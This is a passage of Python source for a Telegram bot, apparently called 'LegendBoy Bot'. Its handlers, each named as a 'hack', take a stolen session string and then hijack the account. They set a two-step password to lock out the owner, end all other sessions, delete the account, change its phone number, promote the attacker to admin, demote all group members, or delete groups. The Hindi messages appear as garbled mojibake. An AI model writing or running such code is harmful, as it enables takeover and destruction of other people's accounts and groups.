                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply(
            "Leaved the Channel/Group рд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж,",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ghack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply(
            "Deleted the Channel/Group рд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Hhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        i = await user2fa(strses.text)
        if i:
            await event.reply(
                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.",
                buttons=keyboard,
            )
        else:
            await event.reply(
                "рдХреНрд╖рдорд╛ рдХрд░реЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА 2 Factor рд▓рдЧрд╛ рд╣реБрдЖ рд╣реИрдВ",
                buttons=keyboard,
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Ihack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await terminate(strses.text)
        await event.reply(
            "рд╕рднреА рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Jhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await delacc(strses.text)
        await event.reply(
            "The Account is deleted SUCCESSFULLLY!!\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Khack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await x.send_message("GROUP/CHANNEL USERNAME рджреЛ")
        grp = await x.get_response()
        await x.send_message("GIVE USER USERNAME рджреЛ")
        user = await x.get_response()
        await promote(strses.text, grp.text, user.text)
        await event.reply(
            "рдореИрдВ рдЖрдкрдХреЛ рдЧреНрд░реБрдк/рдЪреИрдирд▓ рдореЗрдВ рдкреНрд░рдореЛрдЯ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдПрдХ рдорд┐рдирдЯ рд░реБрдХрд┐рдПЁЯШЧЁЯШЧ\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж.",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Lhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
        pro = await x.get_response()
        try:
            await demall(strses.text, pro.text)
        except:
            pass
        await event.reply(
            "рдореИрдВ рд╕рдореВрд╣/рдЪреИрдирд▓ рдХреЗ рд╕рднреА рд╕рджрд╕реНрдпреЛрдВ рдХреЛ рдЕрд╡рдирдд рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдПрдХ рдорд┐рдирдЯ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ ЁЯШЧЁЯШЧ\n\nрд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж",
            buttons=keyboard,
        )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Nhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ", buttons=keyboard
            )
        await x.send_message(
            "рд╡рд╣ рдирдВрдмрд░ рджреЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рдмрджрд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИ\n [рдиреЛрдЯ: DON'T USE TEXTNOW OR 2NDLINE NUMBERS]\n[рдпрджрд┐ рдЖрдк TextNow рдпрд╛ 2nd Line рдирдВрдмрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ OTP рдирд╣реАрдВ рдорд┐рд▓реЗрдЧрд╛] "
        )
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(
                result
                + "\n рдлрд╝реЛрди рдХреЛрдб рд╣реИрд╢ рдХреЙрдкреА рдХрд░реЗрдВ рдФрд░ рдЕрдкрдирд╛ рдирдВрдмрд░ рдЬрд╛рдВрдЪреЗрдВ рдЬреЛ рдЖрдкрдХреЛ рдорд┐рд▓рд╛ рд╣реИ\n рдореИрдВ 20 рд╕реЗрдХрдВрдб рдХреЗ рд▓рд┐рдП рд░реБрдХрддрд╛ рд╣реВрдВ, рдлреЛрди рдХреЛрдб рд╣реИрд╢ рдФрд░ рдУрдЯреАрдкреА рдХреЙрдкреА рдХрд░рддрд╛ рд╣реВрдВ"
            )
            await asyncio.sleep(20)
            await x.send_message("NOW GIVE PHONE CODE HASH")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("NOW GIVE THE OTP")
            otp = (await x.get_response()).text
            changing = await change_number_code(
                strses.text, number, phone_code_hash, otp
            )
            if changing:
                await event.respond("рдмрдзрд╛рдИ рд╣реЛ рдирдВрдмрд░ рдмрджрд▓ рджреА рдЧрдИ")
            else:
                await event.respond("рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЧрдпрд╛")
        except Exception as e:
            await event.respond(
                "рдЗрд╕ рддреНрд░реБрдЯрд┐ рдХреЛ рднреЗрдЬреЗрдВ - @Legend_Userbot\n**LOGS**\n" + str(e)
            )


@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Mhack")))
async def users(event):
    async with tgbot.conversation(event.chat_id) as x:
        await x.send_message("GIVE STRING SESSION")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond(
                "рдпрд╣ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕рддреНрд░ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ.", buttons=keyboard
            )
        await x.send_message("API_ID")
        tola = await x.get_response()
        hmm = tola.message
        apiid = str(hmm)
        await x.send_message("API_HASH")
        hola = await x.get_response()
        nope = hola.message
        apihash = str(nope)
        await x.send_message("рдЕрдм рдЧреНрд░реБрдк/рдЪреИрдирд▓ рджреЗрдВ USERNAME1")
        grp = await x.get_response()
        await x.send_message("рдЕрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рджреЗрдВ рдЬрд┐рд╕рдореЗрдВ рдЖрдк рдЬреЛрдбрд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ")
        urgrp = await x.get_response()
        try:
            i = await login(strses.text, apiid, apihash, grp.text, urgrp.text)
            await asyncio.sleep(20)
            await event.reply(
                i + "рд▓реАрдЬреЗрдВрдбрдмреЙрдпрдмреЛрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж Check Member Is Adding"
            )
        except Exception as e:
            await event.respond(
                "рдЗрд╕ рддреНрд░реБрдЯрд┐ рдХреЛ рдпрд╣рд╛рдВ рднреЗрдЬреЗрдВ - @Legend_Userbot\n**LOGS**\n" + str(e)
            )
